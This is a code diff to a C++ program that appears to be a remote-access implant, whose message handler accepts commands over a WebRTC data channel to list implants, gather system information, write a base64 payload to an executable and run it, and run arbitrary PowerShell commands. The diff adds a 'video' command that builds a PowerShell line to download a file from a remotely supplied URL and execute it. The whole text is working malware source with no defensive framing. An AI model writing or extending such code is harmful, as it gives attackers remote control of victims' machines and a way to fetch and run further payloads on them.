@@ -179,7 +179,7 @@ int main(int argc, char **argv) try {
 		dc->onClosed([c2id]() { 
 			cout << "DataChannel from " << c2id << " closed" << endl; 
 			connected = false;
-
+			return;
 		});
 
 		//On received Message
@@ -228,6 +228,7 @@ string parseMessage(string message) {
 	string cmd3 = "system-info"; // Asks for system information
 	string cmd4 = "load";        // Loads a given file (base64 format)
 	string cmd5 = "cmd";
+	string cmd6 = "video";
 
 	/***
 	 * list-implants | List the implants connected on the network.
@@ -262,9 +263,9 @@ string parseMessage(string message) {
 		              activeProcessorMask;
 		return answer;
 
-		/***
-		 * load | Loads a base64 string to an executable and executes it
-		 ***/
+	/***
+	* load | Loads a base64 string to an executable and executes it
+	***/
 	} else if (strncmp(message.c_str(), cmd4.c_str(), cmd4.size()) == 0) {
 		char *filename = "prueba.txt";
 		cout << "RECEIVED DATA" << endl;
@@ -285,6 +286,10 @@ string parseMessage(string message) {
 			outfile.close();
 			
 		}
+	
+	/***
+	* cmd (Powershell) | Runs the given command in powershell
+	***/
 
 	} else if (strncmp(message.c_str(), cmd5.c_str(), cmd5.size()) == 0) {
 		STARTUPINFO info = {sizeof(info)};
@@ -298,11 +303,33 @@ string parseMessage(string message) {
 		CreateProcess(NULL, cmd2, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
 
 		return "COMPLETED";
+
+	/***
+	* display video | Displays .mp4 video from url
+	***/
+	} else if (strncmp(message.c_str(), cmd6.c_str(), cmd6.size()) == 0) {
+		string data = message.substr(message.find(":") + 1);
+
+		string cmd = "powershell.exe $V = '" + data + "';\n$D = '" + data_directory +
+		             "\\v.mp4';\n$WebClient = New-Object "
+		             "System.Net.WebClient;\n$WebClient.DownloadFile($V,$D);" +
+		             data_directory + "\\v.mp4;";
+
+
+		LPSTR cmd_s = const_cast<char *>(cmd.c_str());
+		LPSTR cmd2_s = const_cast<char *>(cmd2.c_str());
+
+		STARTUPINFO info = {sizeof(info)};
+		PROCESS_INFORMATION processInfo;
+		CreateProcess(NULL, cmd_s, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+
+		return "COMPLETED";
 	} else
 		cout << message << endl;
 
 	return "Received correctly";
 }
+
 
 /***
  * createFileFromBase | Creates a binary from a base64 string and runs it
